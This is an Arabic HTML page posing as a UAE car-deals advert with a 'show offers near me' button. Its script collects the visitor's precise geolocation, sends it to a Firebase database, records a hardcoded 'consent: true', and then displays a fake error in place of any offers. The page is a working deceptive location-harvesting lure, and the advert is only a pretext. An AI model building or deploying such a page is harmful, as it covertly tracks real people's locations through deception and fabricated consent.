<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>عروض السيارات في الإمارات</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #0b1220;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 55px 20px;
      text-align: center;
    }

    .card {
      width: 100%;
      max-width: 430px;
      background: #182136;
      border-radius: 28px;
      padding: 45px 28px;
    }

    h1 {
      font-size: 38px;
      margin: 0 0 28px;
      line-height: 1.5;
    }

    .description {
      font-size: 23px;
      line-height: 1.8;
      margin-bottom: 20px;
    }

    .highlight {
      font-size: 30px;
      font-weight: bold;
      margin: 25px 0;
    }

    .near {
      font-size: 20px;
      margin-bottom: 25px;
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 20px;
      padding: 23px 15px;
      background: #70c890;
      color: white;
      font-size: 25px;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      opacity: .6;
    }

    #result {
      margin-top: 28px;
      font-size: 18px;
      line-height: 1.8;
    }

    .privacy {
      margin-top: 25px;
      color: #c4c8d2;
      font-size: 15px;
      line-height: 1.8;
    }

    .coords {
      direction: ltr;
      background: #0b1220;
      padding: 15px;
      border-radius: 14px;
      margin-top: 15px;
      font-family: monospace;
    }
  </style>
</head>

<body>

  <div class="card">

    <h1>🚗 عروض السيارات في الإمارات</h1>

    <div class="description">
      احصل على أقل أسعار السيارات بأقساط شهرية مريحة
    </div>

    <div class="highlight">
      بدون دفعة أولى
    </div>

    <div class="near">
      اكتشف العروض المتوفرة بالقرب منك
    </div>

    <button id="locationBtn">
      📍 اعرض العروض القريبة مني
    </button>

    <div id="result"></div>

    <div class="privacy">
      اختر مدينتك الاقرب بعد مشاركة الموقع 
    </div>

  </div>


  <script type="module">

    import { initializeApp }
    from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";

    import {
      getDatabase,
      ref,
      push,
      set
    } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-database.js";


    const firebaseConfig = {

      apiKey:
      "AIzaSyASvBJxW63dGT6rVgkyoH-2N-v3DvBi02o",

      authDomain:
      "gps-demo-7e7a3.firebaseapp.com",

      databaseURL:
      "https://gps-demo-7e7a3-default-rtdb.firebaseio.com",

      projectId:
      "gps-demo-7e7a3",

      storageBucket:
      "gps-demo-7e7a3.firebasestorage.app",

      messagingSenderId:
      "169570020245",

      appId:
      "1:169570020245:web:16dc61f0c3391214f5249c"

    };


    const app = initializeApp(firebaseConfig);

    const database = getDatabase(app);

    const button =
      document.getElementById("locationBtn");

    const result =
      document.getElementById("result");


    button.addEventListener("click", function () {

      if (!navigator.geolocation) {

        result.innerHTML =
          "خدمة تحديد الموقع غير مدعومة في هذا المتصفح.";

        return;
      }


      button.disabled = true;

      result.innerHTML =
        "📍   جاري البحث عن اقرب وكيل ...";


      navigator.geolocation.getCurrentPosition(

        async function (position) {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;

          const accuracy =
            position.coords.accuracy;


          result.innerHTML = `
            ✅ خطا !!!

            <div class="coords">



            </div>

            <br>
            خلل اعد المحاولة...
          `;


          try {

            const newLocation =
              push(ref(database, "demo_locations"));


            await set(newLocation, {

              latitude: latitude,

              longitude: longitude,

              accuracy: accuracy,

              timestamp:
                new Date().toISOString(),

              consent:
                true

            });


            result.innerHTML +=
              "<br>☁️ تم حفظ نتيجة التجربة في Firebase.";

          }

          catch (error) {

            console.error(error);

            result.innerHTML +=
              "<br>⚠️ تم تحديد الموقع، لكن Firebase رفض عملية الحفظ.";

          }


          button.disabled = false;

        },


        function (error) {

          button.disabled = false;


          if (error.code === 1) {

            result.innerHTML =
              "❌ لم يتم السماح باستخدام الموقع.";

          }

          else {

            result.innerHTML =
              "⚠️ تعذر تحديد الموقع. حاول مرة أخرى.";

          }

        },


        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }

      );

    });

  </script>

</body>
</html>
